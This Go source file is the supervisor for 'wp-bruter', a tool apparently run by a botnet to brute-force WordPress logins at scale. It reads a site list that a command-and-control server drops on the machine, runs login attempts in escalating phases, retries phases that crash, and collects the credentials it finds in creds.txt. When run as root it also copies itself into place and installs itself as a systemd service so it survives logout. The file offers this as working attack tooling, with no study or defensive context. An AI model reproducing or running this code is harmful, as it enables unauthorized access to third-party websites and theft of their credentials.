package main

// Standalone supervisor: a plain `./wp-bruter` is enough on a prepared box.
//
// The list comes from the CNC (or is dropped in place), so nothing is fetched
// and nothing is sharded here. What the supervisor does add: raise the fd limit
// before any request, walk the attempt phases 150 -> 500 -> 0, retry a phase
// that died, and repeat a sweep while progress still grows. progress.txt keeps
// finished sites out, so every restart is cheap.

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

const (
	superviseEnv = "WP_BRUTER_CHILD"
	servicePath  = "/etc/systemd/system/wp-bruter.service"
)

// Supervisor-only flags, not forwarded to the child.
var incognitoFlags = map[string]bool{
	"auto":       true,
	"sweeps":     true,
	"phase-list": true,
}

// wantsSupervisor reports whether the auto driver has to take over.
func wantsSupervisor(args []string) bool {
	if os.Getenv(superviseEnv) != "" {
		return false
	}
	if *autoRun {
		return true
	}
	for _, a := range args {
		if strings.EqualFold(a, "auto") {
			return true
		}
	}
	// Bare ./wp-bruter on a prepared box: the list is already there, nobody
	// passes flags by hand.
	return !flagSet("sites")
}

// installSelf writes a copy beside the running one and renames it into place,
// because a running binary cannot be overwritten (ETXTBSY).
func installSelf(self, dst string) error {
	if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
		return err
	}
	data, err := os.ReadFile(self)
	if err != nil {
		return err
	}
	tmp := dst + ".new"
	if err := os.WriteFile(tmp, data, 0o755); err != nil {
		return err
	}
	return os.Rename(tmp, dst)
}

// resolveList picks the target list: an explicit -sites wins, otherwise the
// one the CNC dropped at /root, otherwise one beside the binary.
func resolveList() (string, error) {
	if flagSet("sites") {
		return *sitesFile, nil
	}
	for _, c := range []string{*sitesFile, "/root/wordpress.txt", "wordpress.txt", filepath.Join(appDir(), "wordpress.txt")} {
		if info, err := os.Stat(c); err == nil && info.Size() > 0 {
			return c, nil
		}
	}
	return "", fmt.Errorf("no wordpress.txt found (looked at %s, /root and beside the binary)", *sitesFile)
}

// childArgs rebuilds the command line without the supervisor-only flags.
func childArgs(sites string) []string {
	var out []string
	flag.Visit(func(f *flag.Flag) {
		if incognitoFlags[f.Name] || f.Name == "sites" {
			return
		}
		out = append(out, "-"+f.Name+"="+f.Value.String())
	})
	return append(out, "-no-install", "-sites="+sites)
}

// underSystemd is true inside the unit, so the supervisor stops re-installing.
func underSystemd() bool {
	return os.Getenv("INVOCATION_ID") != "" || os.Getenv(superviseEnv) != ""
}

// installAsService writes the unit and starts it, then returns true so the
// caller exits. A bare ./wp-bruter must not live in an SSH session: closing it
// sends SIGHUP and the sweep dies.
func installAsService(self, sites string) bool {
	if underSystemd() || os.Getuid() != 0 {
		return false
	}
	if _, err := exec.LookPath("systemctl"); err != nil {
		return false
	}
	if err := installSelf(self, filepath.Join(installDir, "wp-bruter")); err != nil {
		logPrintf("cannot install to %s: %v\n", installDir, err)
		os.Exit(1)
	}
	// Point the unit at the list the operator actually used.
	cfg := strings.ReplaceAll(defaultConfigEnv, "SITES_FILE=/opt/wp-bruter/wordpress.txt", "SITES_FILE="+sites)
	if err := os.WriteFile(filepath.Join(installDir, "config.env"), []byte(cfg), 0o600); err != nil {
		logPrintf("cannot write config: %v\n", err)
		os.Exit(1)
	}
	if err := os.WriteFile(servicePath, []byte(serviceFile), 0o644); err != nil {
		logPrintf("cannot write unit: %v\n", err)
		os.Exit(1)
	}
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "wp-bruter.service").Run()
	if out, err := exec.Command("systemctl", "restart", "wp-bruter.service").CombinedOutput(); err != nil {
		logPrintf("systemctl restart failed: %v\n%s", err, out)
		os.Exit(1)
	}
	fmt.Printf("service wp-bruter started — SSH may be closed now\n\n")
	fmt.Printf("  systemctl status wp-bruter      # state\n")
	fmt.Printf("  journalctl -u wp-bruter -f      # live log\n")
	fmt.Printf("  systemctl stop wp-bruter        # stop\n")
	fmt.Printf("  %s    # creds\n\n", filepath.Join(installDir, "creds.txt"))
	return true
}

// runSupervised raises the fd limit and walks the phases.
func runSupervised() {
	raiseFDLimit()

	sites, err := resolveList()
	if err != nil {
		logPrintf("%v\n", err)
		os.Exit(1)
	}
	if sites, err = filepath.Abs(sites); err != nil {
		logPrintf("cannot resolve list path: %v\n", err)
		os.Exit(1)
	}

	self := mustExe()
	if os.Chdir(filepath.Dir(self)) != nil {
		logPrintf("cannot enter %s\n", filepath.Dir(self))
	}

	logPrintf("list: %s\n", sites)

	if installAsService(self, sites) {
		return
	}

	phases := parsePhases(*phaseList)
	started := time.Now()
	lastRows := -1
	stalled := 0

	for sweep := 1; sweep <= max(*sweeps, 1); sweep++ {
		logPrintf("=== sweep %d/%d ===\n", sweep, *sweeps)
		for _, lim := range phases {
			// A phase that keeps dying (panic, OOM) is retried: progress.txt
			// makes the restart cheap.
			ok := false
			for try := 1; try <= 5; try++ {
				cmd := exec.Command(self, append(childArgs(sites), "-max-attempts="+strconv.Itoa(lim))...)
				cmd.Env = append(os.Environ(), superviseEnv+"=1")
				cmd.Stdout, cmd.Stderr, cmd.Stdin = os.Stdout, os.Stderr, os.Stdin
				err := cmd.Run()
				pid := cmd.Process.Pid
				waitChildGone(pid, 30*time.Second)
				if err == nil {
					ok = true
					break
				}
				logPrintf("phase %d died (rc=%d), retry %d/5\n", lim, cmd.ProcessState.ExitCode(), try)
				time.Sleep(10 * time.Second)
			}
			if !ok {
				logPrintf("phase %d given up\n", lim)
			}
		}

		rows := progressRows()
		logPrintf("sweep %d done in %s, %d progress rows\n", sweep, time.Since(started).Round(time.Second), rows)
		if rows == lastRows {
			stalled++
		} else {
			stalled = 0
		}
		lastRows = rows
		if stalled > 0 {
			logPrintf("no new progress, stopping\n")
			break
		}
		time.Sleep(20 * time.Second)
	}
	logPrintf("finished. creds: %s\n", filepath.Join(filepath.Dir(self), "creds.txt"))
}

func parsePhases(s string) []int {
	var out []int
	for _, p := range strings.FieldsFunc(s, func(r rune) bool { return r == ',' || r == ' ' }) {
		if n, err := strconv.Atoi(p); err == nil && n >= 0 {
			out = append(out, n)
		}
	}
	if len(out) == 0 {
		return []int{150, 500, 0}
	}
	return out
}

func progressRows() int {
	f, err := os.Open(*progressFile)
	if err != nil {
		return 0
	}
	defer f.Close()
	n := 0
	buf := make([]byte, 1<<16)
	for {
		c, err := f.Read(buf)
		n += strings.Count(string(buf[:c]), "\n")
		if err != nil {
			return n
		}
	}
}

// waitChildGone blocks until pid is gone, so the next phase does not hit the
// PID guard. The supervisor itself is also named wp-bruter, so pgrep by name
// would wait on ourselves.
func waitChildGone(pid int, limit time.Duration) {
	deadline := time.Now().Add(limit)
	for time.Now().Before(deadline) {
		if err := syscall.Kill(pid, 0); err != nil {
			return
		}
		time.Sleep(200 * time.Millisecond)
	}
}

var _ = fmt.Sprintf
